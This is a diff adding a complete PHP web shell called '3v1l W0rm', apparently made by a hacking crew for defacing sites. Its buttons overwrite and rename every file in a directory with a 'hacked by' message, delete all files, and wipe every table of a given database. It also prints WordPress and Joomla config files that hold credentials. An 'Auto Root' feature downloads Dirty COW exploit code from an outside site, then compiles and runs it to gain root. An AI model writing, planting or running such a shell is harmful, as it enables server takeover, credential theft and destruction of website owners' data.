@@ -1,0 +1,561 @@
+<!-- 
+Shell Name = 3v1l W0rm
+Version = 2.0
+Coded By = Rx_XinHad
+Fiture Update = Auto Root
+
+History Version
+V 1.0 => dx3j 
+V 2.0 => Rx_XinHad
+
+We make this shell to prepare war
+	We Are 
+P H O E N I X  T E A M
+dx3j :-: Dreamless :-: Karyo :-: Rx_XinHad :-: N3v4 :-: B4k4n0nym0u5
+
+Just Calm and No Bacod
+-->
+
+
+<html>
+<title>3vil w0rm</title>
+<link rel="icon" href="https://s14.postimg.org/eku7vbett/asd.png" type="image/x-icon">
+<style type="text/css">
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: #000000;
+    color: #ffffff;
+    font-family: 'Ubuntu';
+	font-size: 13px;
+	width: 90%;
+	margin-left: auto;
+    margin-right: auto;
+	
+}
+li {
+	display: inline;
+	margin: 5px;
+	padding: 5px;
+}
+table, th, td {
+	border-collapse:collapse;
+	font-family: Tahoma, Geneva, sans-serif;
+	background: transparent;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+.table_home, .th_home, .td_home {
+	border: 1px solid #ffffff;
+}
+th {
+	padding: 10px;
+}
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+a:hover {
+	color: gold;
+	text-decoration: underline;
+}
+b {
+	color: gold;
+}
+textarea{
+	width: 400px;
+	height: 200px;
+	background-color: black;
+	color: white;
+	overflow:auto;
+}
+.text {
+  fill: none;
+  stroke-width: 6;
+  stroke-linejoin: round;
+  stroke-dasharray: 70 330;
+  stroke-dashoffset: 0;
+  -webkit-animation: stroke 1s infinite linear;
+  animation: stroke 1s infinite linear;
+}
+.text:nth-child(5n + 1) {
+  stroke: #F2385A;
+  -webkit-animation-delay: -1.2s;
+  animation-delay: -1.2s;
+}
+.text:nth-child(5n + 2) {
+  stroke: #F5A503;
+  -webkit-animation-delay: -2.4s;
+  animation-delay: -2.4s;
+}
+.text:nth-child(5n + 3) {
+  stroke: #E9F1DF;
+  -webkit-animation-delay: -3.6s;
+  animation-delay: -3.6s;
+}
+.text:nth-child(5n + 4) {
+  stroke: #56D9CD;
+  -webkit-animation-delay: -4.8s;
+  animation-delay: -4.8s;
+}
+.text:nth-child(5n + 5) {
+  stroke: #3AA1BF;
+  -webkit-animation-delay: -6s;
+  animation-delay: -6s;
+}
+@-webkit-keyframes stroke {
+  100% {
+    stroke-dashoffset: -400;
+  }
+}
+@keyframes stroke {
+  100% {
+    stroke-dashoffset: -400;
+  }
+}
+</style>
+<script> 
+TypingText = function(element, interval, cursor, finishedCallback) {
+if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+this.running = true; // Never run.
+return;
+}
+this.element = element;
+this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+this.origText = this.element.innerHTML;
+this.unparsedOrigText = this.origText;
+this.cursor = (cursor ? cursor : "");
+this.currentText = "";
+this.currentChar = 0;
+this.element.typingText = this;
+if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+TypingText.all.push(this);
+this.running = false;
+this.inTag = false;
+this.tagBuffer = "";
+this.inHTMLEntity = false;
+this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+if(this.running) return;
+if(typeof this.origText == "undefined") {
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+return;
+}
+if(this.currentText == "") this.element.innerHTML = "";
+if(this.currentChar < this.origText.length) {
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+this.tagBuffer = "<";
+this.inTag = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+this.tagBuffer += ">";
+this.inTag = false;
+this.currentText += this.tagBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inTag) {
+this.tagBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+this.HTMLEntityBuffer = "&";
+this.inHTMLEntity = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+this.HTMLEntityBuffer += ";";
+this.inHTMLEntity = false;
+this.currentText += this.HTMLEntityBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inHTMLEntity) {
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else {
+this.currentText += this.origText.charAt(this.currentChar);
+}
+this.element.innerHTML = this.currentText;
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+this.currentChar++;
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+} else {
+this.currentText = "";
+this.currentChar = 0;
+this.running = false;
+this.finishedCallback();
+}
+}
+</script>
+<center>
+<img src="https://s13.postimg.org/eevoczmp3/evil.png"><br></center>
+<?php
+function w($dir,$perm) {
+	if(!is_writable($dir)) {
+		return "<font color=red>".$perm."</font>";
+	} else {
+		return "<font color=lime>".$perm."</font>";
+	}
+}
+function r($dir,$perm) {
+	if(!is_readable($dir)) {
+		return "<font color=red>".$perm."</font>";
+	} else {
+		return "<font color=lime>".$perm."</font>";
+	}
+}
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
+function perms($file){
+	$perms = fileperms($file);
+	if (($perms & 0xC000) == 0xC000) {
+	
+	$info = 's';
+	} elseif (($perms & 0xA000) == 0xA000) {
+	
+	$info = 'l';
+	} elseif (($perms & 0x8000) == 0x8000) {
+	
+	$info = '-';
+	} elseif (($perms & 0x6000) == 0x6000) {
+	
+	$info = 'b';
+	} elseif (($perms & 0x4000) == 0x4000) {
+	
+	$info = 'd';
+	} elseif (($perms & 0x2000) == 0x2000) {
+	
+	$info = 'c';
+	} elseif (($perms & 0x1000) == 0x1000) {
+	
+	$info = 'p';
+	} else {
+	
+	$info = 'u';
+	}
+		
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x' ) :
+	(($perms & 0x0800) ? 'S' : '-'));
+	
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x' ) :
+	(($perms & 0x0400) ? 'S' : '-'));
+	
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x' ) :
+	(($perms & 0x0200) ? 'T' : '-'));
+	return $info;
+}
+
+if(isset($_GET['dir'])) {
+	$dir = $_GET['dir'];
+	chdir($dir);
+} else {
+	$dir = getcwd();
+}
+$dir = str_replace("\\","/",$dir);
+$scdir = explode("/", $dir);
+echo "<center>You are here: ";
+foreach($scdir as $c_dir => $cdir) {	
+	echo "<a href='?dir=";
+	for($i = 0; $i <= $c_dir; $i++) {
+		echo $scdir[$i];
+		if($i != $c_dir) {
+		echo "/";
+		}
+	}
+	echo "'>$cdir</a>/";
+}
+echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]</center><br>";
+
+// Code Menu
+echo '<center>
+<form action="" method="post">
+<input type="submit" name="go" value="Infect File" text="GO!" style="color: white; border: 1px solid red;background-color: #000000">
+<input type="submit" name="sad" value="Delete File" text="GO!" style="color: white; border: 1px solid red;background-color: #000000">
+<input type="submit" name="wp" value="Wordpress Config" text="GO!" style="color: white; border: 1px solid red;background-color: #000000">
+<input type="submit" name="jomla" value="Joomla Config" text="GO!" style="color: white; border: 1px solid red;background-color: #000000">
+<input type="submit" name="aroot" value="Auto Root" text="GO!" style="color: white; border: 1px solid red;background-color: #000000">
+
+<br><br>
+<input size="6" type="text" name="host" placeholder="Host" style="color: white; border: 1px solid red;background-color: #000000">
+<input size="6" type="text" name="username" placeholder="Username" style="color: white; border: 1px solid red;background-color: #000000">
+<input size="6" type="text" name="password" placeholder="Password" style="color: white; border: 1px solid red;background-color: #000000">
+<input size="6" type="text" name="db" placeholder="Database" style="color: white; border: 1px solid red;background-color: #000000">
+<input type="submit" name="drop" value="Drop DB" style="color: red; border: 1px solid red;background-color: #000000">
+<br></center>';
+
+// Code Encrypt File
+if (isset($_POST['go'])) {
+error_reporting(0);
+set_time_limit(0);
+$time_start = microtime(true); 
+for($i=0; $i<1000; $i++){
+}
+$time_end = microtime(true);
+$execution_time = ($time_end - $time_start)/60;
+echo '<font color="white"><br>total time execute in  </font><font color="red">'.$execution_time.'</font><font color="white"> secons</font>';
+$files = glob('*.{*}', GLOB_BRACE);
+foreach ($files as $filename) {
+$a_str = array("hacked by phoenix zuahahahaha");
+$contents = implode(PHP_EOL, $a_str);
+$contents .= PHP_EOL . PHP_EOL;
+file_put_contents($filename, $contents);
+$newname = str_replace(array(".bmp", ".gif", ".jpg", ".png", ".php", ".html", ".txt", ".ico", ".sql", ".ini",".log",".css", ".rar", ".zip", ".xml", ".js", ".dist", ".json", ".scss", ".jpeg", ".crt", ".eot", ".svg", ".ttf", ".woff", ".swf", ".js.gz", ".gz", ".pot", ".htm", ".po", ".mo", ".otf"), ".mewek", $filename);
+if(rename($filename, $newname)===true){
+print '<br><font color="gold">&#8674; '.$filename.'<font color="white"> infected &#128077;</font>'.$time.'';
+} else{
+print '<br><font color="gold">&#8674; '.$filename.'<font color="red"> failed &#128078;</font>'.$time.'';
+}
+}
+}
+if (isset($_POST['sad'])) {
+$files = glob('*.{*}', GLOB_BRACE);
+foreach ($files as $filename) {
+error_reporting(0);
+set_time_limit(0);
+
+if (unlink($filename)) {
+print '<br><font color="gold">&#8674; '.$filename.'<font color="white"> deleted &#128077;</font>';
+} else {
+print '<br><font color="gold">&#8674; '.$filename.'<font color="red"> failed &#128078;</font>';
+}
+}
+}
+
+// Code Drop Database
+if (isset($_POST['drop'])) {
+error_reporting(0);
+set_time_limit(0);
+$time_start = microtime(true); 
+
+for($i=0; $i<1000; $i++){
+}
+$time_end = microtime(true);
+$execution_time = ($time_end - $time_start)/60;
+echo '<font color="white"><br>total time execute in  </font><font color="red">'.$execution_time.'</font><font color="white"> minute</font>';	
+$host = $_POST['host'];
+$username = $_POST['username'];
+$password = $_POST['password'];
+$db = $_POST['db'];
+mysql_connect($host,$username,$password) or die("Failed login tolol");
+mysql_select_db($db) or die("Database ga bisa dibuka tolol");
+
+$res = mysql_query("SHOW TABLES");
+
+$tables = array();
+
+while($row = mysql_fetch_array($res, MYSQL_NUM)) {
+    $tables[] = "$row[0]";
+} 
+$length = count($tables);
+
+for ($i = 0; $i < $length; $i++) {
+    $res = "DELETE FROM $tables[$i]";
+    mysql_query($res);
+	print '<br><font color="gold">&#8674; '.$res.'<font color="white"> success &#128077;</font>';
+}
+}
+
+// Code find wp-config
+if (isset($_POST['wp'])) {
+error_reporting(0);
+set_time_limit(0);
+$file = fopen("wp-config.php", "r") or die("Can't open wp-config.php");
+while(! feof($file))
+  {
+  echo fgets($file). "<br />";
+  }
+fclose($file);
+}
+
+// Code find jomla config
+if (isset($_POST['jomla'])) {
+error_reporting(0);
+set_time_limit(0);
+$file = fopen("configuration.php", "r") or die("Can't open configuration.php");
+while(! feof($file))
+  {
+  echo fgets($file). "<br />";
+  }
+fclose($file);
+}
+
+// Code Auto Root
+if (isset(	$_POST['aroot'])) {
+
+// Proses Download Cowroot 
+file_put_contents("evil.c", file_get_contents("http://haxorid.com/dirty.c"));
+
+// Proses Pengecekan dan Ekseskusi
+$gccevil = shell_exec('gcc -pthread evil.c -o phoenix -lcrypt');
+$hakakses = shell_exec('chmod +x phoenix');
+$eksekusiphx = shell_exec('./phoenix phoenix123');
+$startbanner = '3v1l W0rm 4ut0 r00t H45 B3n St4rt';
+
+// Syntax Eksekusi
+// gcc -pthread evil.c -o phoenix -lcrypt
+// chmod +x phoenix
+// ./phoenix phoenix123 << phoenix123 bisa anda ganti dengan password yg lain
+
+// Output Program
+echo "<center id='info'>";
+echo $gccevil;
+echo $hakakses;
+echo "<h2>";
+echo $startbanner;
+echo "</h2>";
+echo "<textarea>";
+echo $eksekusiphx;
+echo "</textarea>";
+echo "</center>";
+?>
+
+<!-- JavaScript Mengetik Teks -->
+<script type="text/javascript"> 
+new TypingText(document.getElementById("info"), 80, function(i){
+var ar = new Array("_"," ","_","_"); return " " + ar[i.length %
+ar.length]; });
+TypingText.runAll();
+</script>
+
+<?php
+}
+
+// Output Shell
+echo '<br><br><hr>';
+	if(is_dir($dir) === true) {
+		if(!is_readable($dir)) {
+			echo "<font color=red>can't open directory. ( not readable )</font>";
+		} else {
+			echo '<br><br><table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
+			<tr>
+			<th class="th_home"><center>Name</center></th>
+			<th class="th_home"><center>Type</center></th>
+			<th class="th_home"><center>Size</center></th>
+			<th class="th_home"><center>Last Modified</center></th>
+			<th class="th_home"><center>Owner/Group</center></th>
+			<th class="th_home"><center>Permission</center></th
+			</tr>';
+			$scandir = scandir($dir);
+			foreach($scandir as $dirx) {
+				$dtype = filetype("$dir/$dirx");
+				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
+				if(function_exists('posix_getpwuid')) {
+					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
+					$downer = $downer['name'];
+				} else {
+					//$downer = $uid;
+					$downer = fileowner("$dir/$dirx");
+				}
+				if(function_exists('posix_getgrgid')) {
+					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
+					$dgrp = $dgrp['name'];
+				} else {
+					$dgrp = filegroup("$dir/$dirx");
+				}
+ 				if(!is_dir("$dir/$dirx")) continue;
+ 				if($dirx === '..') {
+ 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
+ 				} elseif($dirx === '.') {
+ 					$href = "<a href='?dir=$dir'>$dirx</a>";
+ 				} else {
+ 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
+ 				}
+ 				
+ 				echo "<tr>";
+ 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
+				echo "<td class='td_home'><center>$dtype</center></td>";
+				echo "<td class='td_home'><center>-</center></th></td>";
+				echo "<td class='td_home'><center>$dtime</center></td>";
+				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
+				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
+				
+				echo "</tr>";
+			}
+		}
+	} else {
+		echo "<font color=red>can't open directory.</font>";
+	}
+		foreach($scandir as $file) {
+			$ftype = filetype("$dir/$file");
+			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
+			$size = filesize("$dir/$file")/1024;
+			$size = round($size,3);
+			if(function_exists('posix_getpwuid')) {
+				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
+				$fowner = $fowner['name'];
+			} else {
+				//$downer = $uid;
+				$fowner = fileowner("$dir/$file");
+			}
+			if(function_exists('posix_getgrgid')) {
+				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
+				$fgrp = $fgrp['name'];
+			} else {
+				$fgrp = filegroup("$dir/$file");
+			}
+			if($size > 1024) {
+				$size = round($size/1024,2). 'MB';
+			} else {
+				$size = $size. 'KB';
+			}
+			if(!is_file("$dir/$file")) continue;
+			echo "<tr>";
+			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='>$file</a></td>";
+			echo "<td class='td_home'><center>$ftype</center></td>";
+			echo "<td class='td_home'><center>$size</center></td>";
+			echo "<td class='td_home'><center>$ftime</center></td>";
+			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
+			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
+			echo "</tr>";
+		}
+		echo "</table>";
+		if(!is_readable($dir)) {
+			//
+		}
+		
+
+?>
